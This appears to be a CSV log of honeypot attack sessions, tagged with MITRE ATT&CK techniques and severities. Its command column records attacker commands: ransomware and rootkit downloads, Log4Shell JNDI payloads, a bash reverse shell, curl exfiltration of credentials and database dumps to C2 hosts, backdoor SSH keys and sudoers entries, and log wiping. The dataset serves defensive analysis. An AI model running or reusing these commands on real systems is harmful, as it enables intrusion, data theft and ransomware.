event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-001229,EB762162,2025-03-26T08:33:30Z,command_executed,hp-br-01,5.188.206.26,59580,10.0.4.10,22,ssh,mysql,openwrt,True,chattr +i /etc/passwd /etc/shadow /etc/sudoers /root/.ssh/authorized_keys 2>/dev/null,15,RU,AS50673,Serverius,Rootkit/Persistence,T1098.004,SSH Authorized Keys,critical,,,,140,529,185,rootkit_persistence,False,,3058e0a9-627d-4c36-b6f9-fbddd8c11868,
EVT-001231,EB762162,2025-03-26T08:34:10Z,command_executed,hp-br-01,5.188.206.26,37934,10.0.4.10,22,ssh,mysql,openwrt,True,rm -rf /tmp/reptile* && history -c,17,RU,AS50673,Serverius,Rootkit/Persistence,T1070.003,Clear Command History,low,,,,140,260,425,rootkit_persistence,False,,3ed74a75-bce8-4130-995f-757afea59d2b,
EVT-001230,EB762162,2025-03-26T08:36:15Z,command_executed,hp-br-01,5.188.206.26,48958,10.0.4.10,22,ssh,mysql,openwrt,True,systemctl enable sshd 2>/dev/null && systemctl start sshd 2>/dev/null,16,RU,AS50673,Serverius,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,140,437,433,rootkit_persistence,False,,b41fa266-0138-4597-bb99-9337d09ed1ff,
EVT-003429,28DDC731,2025-03-26T09:04:28Z,login_attempt,hp-eu-01,198.199.119.50,34126,10.0.1.10,22,ssh,monitor,icatch99,False,,0,US,AS14061,DigitalOcean,Cryptomining,T1110,Brute Force,medium,,,,544,718,1846,brute_force,False,,,
EVT-003623,D2BB4334,2025-03-26T21:39:14Z,login_attempt,hp-ap-01,185.129.62.62,40767,10.0.3.10,2222,ssh,vagrant,VMware1!,False,,0,DK,AS29791,Zayo,Redis Exploitation,T1110,Brute Force,medium,,,,493,429,940,brute_force,False,,,
EVT-000390,EAA72B0D,2025-03-27T05:46:33Z,login_attempt,hp-eu-01,167.99.207.73,45042,10.0.1.10,22,ssh,deploy,123456,False,,0,GB,AS14061,DigitalOcean LON,Botnet/DDoS,T1110,Brute Force,medium,,,,384,876,2599,brute_force,False,,,
EVT-000321,DB368457,2025-03-27T21:08:22Z,login_attempt,hp-eu-01,198.199.119.50,53617,10.0.1.10,23,telnet,deploy,Juniper1!,True,,0,US,AS14061,DigitalOcean,Ransomware Staging,T1110,Brute Force,high,,,,22,819,429,compromised_login,False,,d38f29f1-35af-4ca4-9b5b-6e50b3876d13,
EVT-000323,DB368457,2025-03-27T21:08:34Z,command_executed,hp-eu-01,198.199.119.50,45630,10.0.1.10,23,telnet,deploy,Juniper1!,True,df -h && lsblk,2,US,AS14061,DigitalOcean,Ransomware Staging,T1082,System Information Discovery,low,,,,22,355,452,ransomware_staging,False,,7cd74aa1-97c1-4513-9ff1-be790dd469be,
EVT-000324,DB368457,2025-03-27T21:08:43Z,command_executed,hp-eu-01,198.199.119.50,58181,10.0.1.10,23,telnet,deploy,Juniper1!,True,find / -type f -name '*.py' -o -name '*.java' -o -name '*.go' 2>/dev/null | wc -l,3,US,AS14061,DigitalOcean,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,22,550,240,ransomware_staging,False,,71841f35-73c5-423e-b0fb-5de7b4ecd76a,
EVT-000322,DB368457,2025-03-27T21:08:53Z,command_executed,hp-eu-01,198.199.119.50,48324,10.0.1.10,23,telnet,deploy,Juniper1!,True,uname -a && id,1,US,AS14061,DigitalOcean,Ransomware Staging,T1082,System Information Discovery,low,,,,22,265,273,ransomware_staging,False,,d3a737f8-ea4c-41c3-8b57-53437ff7fa16,
EVT-000330,DB368457,2025-03-27T21:09:43Z,command_executed,hp-eu-01,198.199.119.50,37209,10.0.1.10,23,telnet,deploy,Juniper1!,True,openssl genrsa -out /tmp/victim.key 2048 2>/dev/null,9,US,AS14061,DigitalOcean,Ransomware Staging,T1486,Data Encrypted for Impact,critical,,,,22,464,401,ransomware_staging,False,,a4001d42-a5c0-4db0-966d-52e5871d420b,
EVT-000326,DB368457,2025-03-27T21:09:52Z,command_executed,hp-eu-01,198.199.119.50,51453,10.0.1.10,23,telnet,deploy,Juniper1!,True,ls /mnt /media /backup 2>/dev/null,5,US,AS14061,DigitalOcean,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,22,478,440,ransomware_staging,False,,0516b8dd-8ad7-4cab-9133-5eb0633672fd,
EVT-000325,DB368457,2025-03-27T21:10:02Z,command_executed,hp-eu-01,198.199.119.50,60620,10.0.1.10,23,telnet,deploy,Juniper1!,True,find /home /var/www /opt /srv -type f 2>/dev/null | wc -l,4,US,AS14061,DigitalOcean,Ransomware Staging,T1083,File and Directory Discovery,low,,,,22,413,53,ransomware_staging,False,,a4b09aea-1570-4153-9a29-b42200e5c158,
EVT-000335,DB368457,2025-03-27T21:10:42Z,command_executed,hp-eu-01,198.199.119.50,37145,10.0.1.10,23,telnet,deploy,Juniper1!,True,rm -f /tmp/victim.key /tmp/victim.pub,14,US,AS14061,DigitalOcean,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,22,380,262,ransomware_staging,False,,abb82efe-2d37-4b19-b33c-026ac4d38bb3,
EVT-000331,DB368457,2025-03-27T21:10:52Z,command_executed,hp-eu-01,198.199.119.50,55138,10.0.1.10,23,telnet,deploy,Juniper1!,True,openssl rsa -in /tmp/victim.key -pubout -out /tmp/victim.pub 2>/dev/null,10,US,AS14061,DigitalOcean,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,22,282,183,ransomware_staging,False,,9aa8477a-b8fd-4607-9f66-d1494682375d,
EVT-000328,DB368457,2025-03-27T21:11:03Z,command_executed,hp-eu-01,198.199.119.50,53602,10.0.1.10,23,telnet,deploy,Juniper1!,True,wget -q http://45.142.212.100/ransom/locker_x64 -O /tmp/.locker,7,US,AS14061,DigitalOcean,Ransomware Staging,T1105,Ingress Tool Transfer,critical,yes,45.142.212.100,3df3368ff8464deb8d302e555bedb0ab,22,90,60,ransomware_staging,False,,f331b2cd-3e2b-460a-8a8a-097abc052ea6,
EVT-000329,DB368457,2025-03-27T21:11:18Z,command_executed,hp-eu-01,198.199.119.50,42139,10.0.1.10,23,telnet,deploy,Juniper1!,True,chmod +x /tmp/.locker,8,US,AS14061,DigitalOcean,Ransomware Staging,T1486,Data Encrypted for Impact,critical,,,,22,257,431,ransomware_staging,False,,a92ebcbf-d96b-4b35-8011-14829ae76861,
EVT-000334,DB368457,2025-03-27T21:11:24Z,command_executed,hp-eu-01,198.199.119.50,50333,10.0.1.10,23,telnet,deploy,Juniper1!,True,cat /tmp/README_DECRYPT.txt,13,US,AS14061,DigitalOcean,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,22,465,242,ransomware_staging,False,,78a23304-ba15-471e-8071-9ada363fa7e4,
EVT-000327,DB368457,2025-03-27T21:12:28Z,command_executed,hp-eu-01,198.199.119.50,59651,10.0.1.10,23,telnet,deploy,Juniper1!,True,df -h | grep -v tmpfs,6,US,AS14061,DigitalOcean,Ransomware Staging,T1082,System Information Discovery,low,,,,22,197,471,ransomware_staging,False,,fd21d1fe-c8eb-4d85-a7e2-7f4b7093bed8,
EVT-000333,DB368457,2025-03-27T21:12:46Z,command_executed,hp-eu-01,198.199.119.50,55909,10.0.1.10,23,telnet,deploy,Juniper1!,True,/tmp/.locker --target /home --ext .l0ck3d --note /tmp/README_DECRYPT.txt --dry-run,12,US,AS14061,DigitalOcean,Ransomware Staging,T1486,Data Encrypted for Impact,critical,,,,22,412,53,ransomware_staging,False,,6e18a3a5-a974-45dd-8a59-507ad89395ea,
EVT-000332,DB368457,2025-03-27T21:14:47Z,command_executed,hp-eu-01,198.199.119.50,33227,10.0.1.10,23,telnet,deploy,Juniper1!,True,curl -X POST http://45.142.212.100:443/keys -d @/tmp/victim.pub,11,US,AS14061,DigitalOcean,Ransomware Staging,T1041,Exfiltration Over C2,critical,,45.142.212.100,,22,211,326,ransomware_staging,False,,d3c6713c-41e1-499d-8279-6506f400258a,
EVT-000336,DB368457,2025-03-27T21:17:22Z,command_executed,hp-eu-01,198.199.119.50,51516,10.0.1.10,23,telnet,deploy,Juniper1!,True,history -c,15,US,AS14061,DigitalOcean,Ransomware Staging,T1070.003,Clear Command History,low,,,,22,177,164,ransomware_staging,False,,114bcfa5-2b14-43f0-b46d-87bb45eda042,
EVT-001567,7A13C93A,2025-03-28T01:24:25Z,login_attempt,hp-us-01,36.110.228.254,36174,10.0.2.10,22,ssh,devops,admin,True,,0,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1110,Brute Force,high,,,,487,886,1164,compromised_login,False,,31cd3fbd-13d2-4f05-b601-f291da73f63b,
EVT-001569,7A13C93A,2025-03-28T01:24:35Z,command_executed,hp-us-01,36.110.228.254,38424,10.0.2.10,22,ssh,devops,admin,True,cat /proc/net/tcp | head,2,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,low,,,,487,590,277,log4shell_webexploit,False,,8906721a-14a6-4299-8949-7309f3690e77,
EVT-001568,7A13C93A,2025-03-28T01:24:46Z,command_executed,hp-us-01,36.110.228.254,38086,10.0.2.10,22,ssh,devops,admin,True,id && uname -a,1,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1082,System Information Discovery,low,,,,487,413,45,log4shell_webexploit,False,,fd790c42-83e4-40ae-a361-445eed5f52f4,
EVT-001571,7A13C93A,2025-03-28T01:24:57Z,command_executed,hp-us-01,36.110.228.254,38778,10.0.2.10,22,ssh,devops,admin,True,curl -sk http://localhost/actuator/heapdump -o /tmp/.heap.bin 2>/dev/null,4,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,medium,yes,,2965ff82d4ed4cca854218ac540c3946,487,166,127,log4shell_webexploit,False,,0b09a639-62a8-498d-a967-538478272992,
EVT-001575,7A13C93A,2025-03-28T01:25:05Z,command_executed,hp-us-01,36.110.228.254,44316,10.0.2.10,22,ssh,devops,admin,True,curl -sk 'http://localhost:8080/login' -d 'username=${jndi:ldap://185.220.101.47:1389/a}&password=x',8,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,critical,,185.220.101.47,,487,255,334,log4shell_webexploit,False,,e045cbdf-763b-41cb-b6f3-a7043b428152,
EVT-001578,7A13C93A,2025-03-28T01:25:09Z,command_executed,hp-us-01,36.110.228.254,58454,10.0.2.10,22,ssh,devops,admin,True,/tmp/.chisel client 185.220.101.47:8888 R:socks 2>/dev/null &,11,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1572,Protocol Tunneling,critical,,185.220.101.47,,487,340,87,log4shell_webexploit,False,,74a1152e-8c2f-46f9-816c-bb9ecbf669d4,
EVT-001574,7A13C93A,2025-03-28T01:26:17Z,command_executed,hp-us-01,36.110.228.254,59809,10.0.2.10,22,ssh,devops,admin,True,curl -sk 'http://localhost:8080/' -H 'X-Api-Version: ${jndi:ldap://185.220.101.47:1389/a}',7,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,critical,,185.220.101.47,,487,123,263,log4shell_webexploit,False,,e0b02a29-62fd-41d1-990f-27578396c7b3,
EVT-001570,7A13C93A,2025-03-28T01:26:40Z,command_executed,hp-us-01,36.110.228.254,35222,10.0.2.10,22,ssh,devops,admin,True,curl -sk http://localhost/actuator/env 2>/dev/null | python3 -m json.tool | head -50,3,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,medium,yes,,4fb1b4e046344062bc1a298f7455c885,487,212,203,log4shell_webexploit,False,,500637a8-147e-4a3a-9a3e-0dab5e8f746f,
EVT-001572,7A13C93A,2025-03-28T01:28:05Z,command_executed,hp-us-01,36.110.228.254,41910,10.0.2.10,22,ssh,devops,admin,True,strings /tmp/.heap.bin | grep -iE 'password|secret|key|token|credential' | head -30,5,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1552,Unsecured Credentials,low,,,,487,112,458,log4shell_webexploit,False,,58f7cbb6-c7f3-4de2-aa78-9c9cfb1cbdac,
EVT-001577,7A13C93A,2025-03-28T01:28:15Z,command_executed,hp-us-01,36.110.228.254,58377,10.0.2.10,22,ssh,devops,admin,True,wget -q http://185.220.101.47/tools/chisel_linux -O /tmp/.chisel && chmod +x /tmp/.chisel,10,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1105,Ingress Tool Transfer,critical,yes,185.220.101.47,dfd1bd2d963d4245b94226cc36cb6031,487,490,198,log4shell_webexploit,False,,e1810354-13f7-421e-9d22-798ed06582fe,
EVT-001573,7A13C93A,2025-03-28T01:28:49Z,command_executed,hp-us-01,36.110.228.254,45881,10.0.2.10,22,ssh,devops,admin,True,find / -name 'log4j*.jar' -o -name '*log4j*' 2>/dev/null | head -10,6,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1190,Exploit Public-Facing Application,high,,,,487,248,433,log4shell_webexploit,True,,18351c67-1abb-4367-844d-f63829e95f52,
EVT-001579,7A13C93A,2025-03-28T01:29:01Z,command_executed,hp-us-01,36.110.228.254,53028,10.0.2.10,22,ssh,devops,admin,True,rm -f /tmp/.heap.bin /tmp/JNDI-Exploit.jar,12,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1059,Command and Scripting Interpreter,low,,,,487,234,142,log4shell_webexploit,False,,c9c5da24-7abc-4b47-9cdc-13c57c75c8b2,
EVT-001576,7A13C93A,2025-03-28T01:29:04Z,command_executed,hp-us-01,36.110.228.254,34404,10.0.2.10,22,ssh,devops,admin,True,java -jar /tmp/JNDI-Exploit.jar -C 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1' -A 185.220.101.47 2>/dev/null &,9,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1059.004,Unix Shell,low,,185.220.101.47,,487,396,413,log4shell_webexploit,False,,67797518-958f-4fb2-b276-0e54531fad79,
EVT-001580,7A13C93A,2025-03-28T01:30:03Z,command_executed,hp-us-01,36.110.228.254,47920,10.0.2.10,22,ssh,devops,admin,True,history -c,13,CN,AS4812,ChinaTelecom SH,Log4Shell/WebExploit,T1070.003,Clear Command History,low,,,,487,370,100,log4shell_webexploit,False,,94f8fe2f-cf30-4f61-8954-88c4ddcda8e1,
EVT-001982,A0BB186B,2025-03-28T05:23:12Z,login_attempt,hp-br-01,45.142.212.100,40994,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,,0,RU,AS197695,Reg.ru,Data Exfiltration,T1110,Brute Force,high,,,,10,478,2437,compromised_login,False,,002cf349-f7ef-4c9b-83dd-d08a51d812cb,
EVT-001985,A0BB186B,2025-03-28T05:23:33Z,command_executed,hp-br-01,45.142.212.100,58980,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,cat /etc/environment,3,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,242,111,data_exfiltration,False,,58f66985-ec4f-4fda-9e41-9e79876d75a1,
EVT-001992,A0BB186B,2025-03-28T05:23:42Z,command_executed,hp-br-01,45.142.212.100,38678,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,aws s3 ls 2>/dev/null,10,RU,AS197695,Reg.ru,Data Exfiltration,T1530,Data from Cloud Storage,low,,,,10,120,469,data_exfiltration,False,,ab731ef1-7cd6-4f18-9452-7f965e70b073,
EVT-001983,A0BB186B,2025-03-28T05:23:53Z,command_executed,hp-br-01,45.142.212.100,50035,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,uname -a,1,RU,AS197695,Reg.ru,Data Exfiltration,T1082,System Information Discovery,low,,,,10,456,116,data_exfiltration,False,,00e5215c-7cd4-4424-b724-a4d482735f5c,
EVT-001984,A0BB186B,2025-03-28T05:23:58Z,command_executed,hp-br-01,45.142.212.100,57831,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,env | grep -iE 'aws|secret|key|token|pass|db|database',2,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,511,276,data_exfiltration,False,,166f17f0-ad0e-4014-ae4b-1421b99434bb,
EVT-002000,A0BB186B,2025-03-28T05:24:24Z,command_executed,hp-br-01,45.142.212.100,39510,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,shred -u -z -n3 /var/log/auth.log /var/log/syslog 2>/dev/null,18,RU,AS197695,Reg.ru,Data Exfiltration,T1070.004,File Deletion,low,,,,10,201,442,data_exfiltration,False,,7daeb592-7308-44e9-94e2-cebbebd65cd7,
EVT-001988,A0BB186B,2025-03-28T05:24:36Z,command_executed,hp-br-01,45.142.212.100,37526,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,find / -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -20,6,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,584,389,data_exfiltration,False,,c8ecd970-b8aa-48c6-a31e-2988c2824645,
EVT-001996,A0BB186B,2025-03-28T05:24:50Z,command_executed,hp-br-01,45.142.212.100,55626,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,mysqldump -u root -p'root' --all-databases 2>/dev/null > /tmp/.all_db.sql,14,RU,AS197695,Reg.ru,Data Exfiltration,T1005,Data from Local System,high,,,,10,434,423,data_exfiltration,False,,7f61e007-0b73-4966-b6d4-50fd671103bc,
EVT-001986,A0BB186B,2025-03-28T05:25:16Z,command_executed,hp-br-01,45.142.212.100,59237,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,find / -name '.env' -o -name '*.env' 2>/dev/null | head -30,4,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,102,190,data_exfiltration,False,,d26a3b96-e617-4275-837c-3b998c2d74fc,
EVT-001998,A0BB186B,2025-03-28T05:26:40Z,command_executed,hp-br-01,45.142.212.100,57604,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,curl -s -F 'f=@/tmp/.loot.tgz' http://185.220.101.47:8080/rx,16,RU,AS197695,Reg.ru,Data Exfiltration,T1041,Exfiltration Over C2,critical,,185.220.101.47,,10,84,466,data_exfiltration,False,,c9e592ee-d335-4bde-88a3-4a1453e3c06d,
EVT-002001,A0BB186B,2025-03-28T05:26:41Z,command_executed,hp-br-01,45.142.212.100,36370,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,history -c && unset HISTFILE && export HISTSIZE=0,19,RU,AS197695,Reg.ru,Data Exfiltration,T1070.003,Clear Command History,low,,,,10,296,384,data_exfiltration,False,,ff846c8c-0d85-414d-9d91-cf2e09a7a5c6,
EVT-001987,A0BB186B,2025-03-28T05:26:47Z,command_executed,hp-br-01,45.142.212.100,45251,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,find / -name 'config.yml' -o -name 'database.yml' -o -name 'secrets.yml' 2>/dev/null | head -20,5,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,548,94,data_exfiltration,False,,6704f305-7b2b-4815-8181-cde174ef6322,
EVT-001990,A0BB186B,2025-03-28T05:26:56Z,command_executed,hp-br-01,45.142.212.100,60981,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,cat ~/.aws/config 2>/dev/null,8,RU,AS197695,Reg.ru,Data Exfiltration,T1552.001,Credentials in Files,low,,,,10,172,233,data_exfiltration,False,,4296b06b-3560-43f0-b9a6-f6f3289b6cf5,
EVT-001989,A0BB186B,2025-03-28T05:27:24Z,command_executed,hp-br-01,45.142.212.100,40740,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,cat ~/.aws/credentials 2>/dev/null,7,RU,AS197695,Reg.ru,Data Exfiltration,T1552.001,Credentials in Files,low,,,,10,262,222,data_exfiltration,False,,3c9818a0-ea2b-4d41-bbf1-7625888192c5,
EVT-001991,A0BB186B,2025-03-28T05:27:42Z,command_executed,hp-br-01,45.142.212.100,59194,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,aws sts get-caller-identity 2>/dev/null,9,RU,AS197695,Reg.ru,Data Exfiltration,T1078.004,Cloud Accounts,low,,,,10,115,233,data_exfiltration,False,,84726247-3bb3-4dcb-ae81-9ca6dc95e35e,
EVT-001995,A0BB186B,2025-03-28T05:29:16Z,command_executed,hp-br-01,45.142.212.100,39906,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,cat /var/www/html/wp-config.php 2>/dev/null | grep -E 'DB_|AUTH_KEY',13,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,192,62,data_exfiltration,False,,e2d045ff-8e8e-47ba-9273-27d8f79778cc,
EVT-001993,A0BB186B,2025-03-28T05:29:37Z,command_executed,hp-br-01,45.142.212.100,35838,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,aws secretsmanager list-secrets 2>/dev/null,11,RU,AS197695,Reg.ru,Data Exfiltration,T1555,Credentials from Password Stores,high,,,,10,111,339,data_exfiltration,False,,81009b6b-c4a6-4f51-97d3-ea24aed66431,
EVT-001994,A0BB186B,2025-03-28T05:31:48Z,command_executed,hp-br-01,45.142.212.100,46971,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,find /var/www -name 'wp-config.php' -o -name '.htpasswd' 2>/dev/null,12,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,250,102,data_exfiltration,False,,e0a43ef9-6ea0-422a-bfad-aa829ec7b3a9,
EVT-001997,A0BB186B,2025-03-28T05:33:42Z,command_executed,hp-br-01,45.142.212.100,44328,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,tar czf /tmp/.loot.tgz /tmp/.all_db.sql ~/.aws/ ~/.ssh/ 2>/dev/null,15,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,150,328,data_exfiltration,False,,db8dce11-7daf-4ca1-bb96-3101038875a9,
EVT-001999,A0BB186B,2025-03-28T05:35:40Z,command_executed,hp-br-01,45.142.212.100,59455,10.0.4.10,22,ssh,oracle,Sup3rS3cr3t!,True,rm -rf /tmp/.loot.tgz /tmp/.all_db.sql,17,RU,AS197695,Reg.ru,Data Exfiltration,T1059,Command and Scripting Interpreter,low,,,,10,306,242,data_exfiltration,False,,0c6d2607-11c6-4685-8b56-df1d9f0d01e0,
EVT-003266,B3D3AC71,2025-03-28T09:10:49Z,login_attempt,hp-eu-01,167.99.207.73,39026,10.0.1.10,2222,ssh,operator,Juniper1!,True,,0,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1110,Brute Force,high,,,,56,842,2888,compromised_login,False,,6ac4c416-3f1c-44d9-801d-10dc94f833e9,
EVT-003267,B3D3AC71,2025-03-28T09:11:01Z,command_executed,hp-eu-01,167.99.207.73,38821,10.0.1.10,2222,ssh,operator,Juniper1!,True,uname -a && uname -r,1,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1082,System Information Discovery,low,,,,56,530,389,rootkit_persistence,False,,2366b39b-e7ee-4b08-9ead-5d4ddcd96c90,
EVT-003268,B3D3AC71,2025-03-28T09:11:07Z,command_executed,hp-eu-01,167.99.207.73,34148,10.0.1.10,2222,ssh,operator,Juniper1!,True,lsmod | head -20,2,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,56,376,172,rootkit_persistence,False,,7010bdc2-2620-4530-9f5d-629759882a02,
EVT-003270,B3D3AC71,2025-03-28T09:11:21Z,command_executed,hp-eu-01,167.99.207.73,49886,10.0.1.10,2222,ssh,operator,Juniper1!,True,setenforce 0 2>/dev/null; systemctl stop apparmor 2>/dev/null,4,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1562.001,Disable Security Tools,low,,,,56,241,169,rootkit_persistence,False,,c4d3a6fd-bb21-4321-a581-b94ae98fdc70,
EVT-003269,B3D3AC71,2025-03-28T09:11:25Z,command_executed,hp-eu-01,167.99.207.73,33583,10.0.1.10,2222,ssh,operator,Juniper1!,True,dmesg | tail -10,3,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,56,280,224,rootkit_persistence,False,,7e797dde-b394-4b12-a0fb-1c463b8b46ff,
EVT-003280,B3D3AC71,2025-03-28T09:11:31Z,command_executed,hp-eu-01,167.99.207.73,36584,10.0.1.10,2222,ssh,operator,Juniper1!,True,mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... backdoor@ops' >> /root/.ssh/authorized_keys,14,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1098.004,SSH Authorized Keys,high,,,,56,90,379,rootkit_persistence,False,,c909ffa3-4bae-428b-a3c9-080b75beff44,
EVT-003274,B3D3AC71,2025-03-28T09:12:09Z,command_executed,hp-eu-01,167.99.207.73,59476,10.0.1.10,2222,ssh,operator,Juniper1!,True,insmod /lib/modules/$(uname -r)/extra/reptile.ko 2>/dev/null,8,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1082,System Information Discovery,low,,,,56,440,209,rootkit_persistence,False,,4e52c1ea-ed08-4c0b-8f1e-5a8fcd08254f,
EVT-003283,B3D3AC71,2025-03-28T09:12:31Z,command_executed,hp-eu-01,167.99.207.73,60561,10.0.1.10,2222,ssh,operator,Juniper1!,True,rm -rf /tmp/reptile* && history -c,17,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1070.003,Clear Command History,low,,,,56,207,131,rootkit_persistence,False,,eea72edf-b529-497a-b0db-b16e80f5d28a,
EVT-003277,B3D3AC71,2025-03-28T09:12:39Z,command_executed,hp-eu-01,167.99.207.73,37709,10.0.1.10,2222,ssh,operator,Juniper1!,True,echo 'svc_monitor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,11,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,56,300,150,rootkit_persistence,False,,b64c6325-8a20-4d41-b82e-632d5c0d7abb,
EVT-003271,B3D3AC71,2025-03-28T09:13:29Z,command_executed,hp-eu-01,167.99.207.73,39538,10.0.1.10,2222,ssh,operator,Juniper1!,True,apt-get update -qq && apt-get install -y -qq gcc make libssl-dev 2>/dev/null,5,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,56,262,493,rootkit_persistence,False,,55d5e1b4-c5da-48fb-b9b7-c09fb8623433,
EVT-003272,B3D3AC71,2025-03-28T09:14:01Z,command_executed,hp-eu-01,167.99.207.73,53805,10.0.1.10,2222,ssh,operator,Juniper1!,True,cd /tmp && curl -O http://91.92.251.103/rootkit/reptile.tar.gz,6,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1105,Ingress Tool Transfer,medium,yes,91.92.251.103,4d129d9f904747aaa87771a3b551cb6f,56,450,486,rootkit_persistence,False,,057743a8-6ea1-44fd-9311-5b6df0fdc0f2,
EVT-003273,B3D3AC71,2025-03-28T09:14:05Z,command_executed,hp-eu-01,167.99.207.73,56823,10.0.1.10,2222,ssh,operator,Juniper1!,True,tar xzf reptile.tar.gz && cd reptile && make install 2>/dev/null,7,GB,AS14061,DigitalOcean LON,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,56,348,42,rootkit_persistence,False,,eeed1d2e-7b55-4588-b910-22a6f383b534,
